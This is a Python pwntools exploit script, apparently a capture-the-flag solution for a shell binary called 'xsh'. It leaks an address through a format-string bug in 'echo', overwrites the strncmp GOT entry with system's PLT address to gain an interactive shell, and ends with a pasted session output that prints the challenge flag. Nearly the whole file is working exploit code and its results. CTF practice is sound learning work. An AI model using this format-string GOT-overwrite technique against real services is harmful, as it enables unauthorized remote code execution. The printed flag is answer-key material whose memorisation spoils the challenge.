# Imports
import re, sys, time
from pwn import *
# Set pwntools context to i386
context.update(arch='i386')

# Global debug flag
DEBUG = True

def main():
  """
  Runs on program execution.
  """

  elf = ELF('xsh')

  # Read libc into pwntools and connect to the challenge binary
  if DEBUG:  
    p = remote('localhost', 5555)
    print("Connected to challenge and waiting for debugger to attach. Press any key to continue...")
    sys.stdin.read(1)
  else:
    p = remote('35.192.206.226', 5555)

  p.recv()
  p.sendline(b"echo %08x")
  echo_str_addr = int(p.recv()[:8], 16)
  entry_addr = echo_str_addr - 0x12ae
  elf.address = entry_addr - elf.entry
  
  print("elf.address = " + hex(elf.address))
  print("strncmp_got = " + hex(elf.got['strncmp']))
  print("system_plt = " + hex(elf.plt['system']))
  
  system_plt_top = elf.plt['system'] >> 16
  system_plt_bottom = elf.plt['system'] & 0xffff
  
  time.sleep(.1)

  if system_plt_top < system_plt_bottom:
    print("system_plt_top < system_plt_bottom")
    offset1 = system_plt_top - 11
    offset2 = (system_plt_bottom - system_plt_top)
    offset1 = b'%' + b'%d' % (offset1) + b'x'
    offset2 = b'%' + b'%d' % (offset2) + b'x'

    p.sendline(b"echo " + b"AAA" + p32(elf.got['strncmp']+2) + p32(elf.got['strncmp']) + offset1 + b"%25$hn" + offset2 + b"%26$hn") 
  else:
    print("system_plt_top > system_plt_bottom")
    offset1 = system_plt_bottom - 11
    offset2 = (system_plt_top - system_plt_bottom)
    offset1 = b'%' + b'%d' % (offset1) + b'x'
    offset2 = b'%' + b'%d' % (offset2) + b'x'

    p.sendline(b"echo " + b"AAA" + p32(elf.got['strncmp']) + p32(elf.got['strncmp']+2) + offset1 + b"%25$hn" + offset2 + b"%26$hn")
  
  p.interactive()

  """
  [xsh]-[/home/vuln]$ $ id
  uid=1000(vuln) gid=1000(vuln) groups=1000(vuln)
  total 40
  4 drwxr-xr-x 1 root vuln  4096 Oct  9 10:11 .
  4 drwxr-xr-x 1 root root  4096 Oct  9 10:11 ..
  4 -rwxr-xr-x 1 root vuln   220 Apr  9  2014 .bash_logout
  4 -rwxr-xr-x 1 root vuln  3637 Apr  9  2014 .bashrc
  4 -rwxr-xr-x 1 root vuln   675 Apr  9  2014 .profile
  4 -rw-r--r-- 1 root root    28 Oct  9 09:27 flag.txt
  16 -rwxr-xr-x 1 root root 15972 Oct  9 09:27 vuln
  [xsh]-[/home/vuln]$ $ cat flag.txt
  rooters{ep1c_xsh_esc4p3}ctf
  total 40
  4 drwxr-xr-x 1 root vuln  4096 Oct  9 10:11 .
  4 drwxr-xr-x 1 root root  4096 Oct  9 10:11 ..
  4 -rwxr-xr-x 1 root vuln   220 Apr  9  2014 .bash_logout
  4 -rwxr-xr-x 1 root vuln  3637 Apr  9  2014 .bashrc
  4 -rwxr-xr-x 1 root vuln   675 Apr  9  2014 .profile
  4 -rw-r--r-- 1 root root    28 Oct  9 09:27 flag.txt
  16 -rwxr-xr-x 1 root root 15972 Oct  9 09:27 vuln
  """

# Hook
if __name__ == '__main__':
  main()
